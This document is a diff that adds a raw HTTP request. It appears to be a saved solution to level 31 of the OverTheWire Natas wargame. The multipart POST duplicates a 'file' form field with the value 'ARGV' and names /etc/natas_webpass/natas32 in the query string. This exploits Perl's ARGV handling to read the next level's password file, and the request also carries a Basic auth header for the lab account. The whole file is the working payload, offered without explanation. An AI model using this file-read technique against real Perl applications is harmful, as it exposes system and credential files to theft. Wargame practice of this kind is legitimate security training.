@@ -1,0 +1,28 @@
+POST /index.pl?/etc/natas_webpass/natas32 HTTP/1.1
+Host: natas31.natas.labs.overthewire.org
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/form-data; boundary=---------------------------182190073921932224813968560061
+Content-Length: 426
+Origin: http://natas31.natas.labs.overthewire.org
+Authorization: Basic bmF0YXMzMTpBTVpGMTR5a25PbjlVYzU3dUtCMDJqbll1aHBsWWthMw==
+Connection: close
+Referer: http://natas31.natas.labs.overthewire.org/index.pl
+Cookie: __utma=176859643.1399902936.1680016716.1680101791.1680113390.6; __utmz=176859643.1680101791.5.4.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); __utmc=176859643
+Upgrade-Insecure-Requests: 1
+
+-----------------------------182190073921932224813968560061
+Content-Disposition: form-data; name="file"
+
+ARGV
+-----------------------------182190073921932224813968560061
+Content-Disposition: form-data; name="file"; filename="abc"
+
+abcde
+-----------------------------182190073921932224813968560061
+Content-Disposition: form-data; name="submit"
+
+Upload
+-----------------------------182190073921932224813968560061--
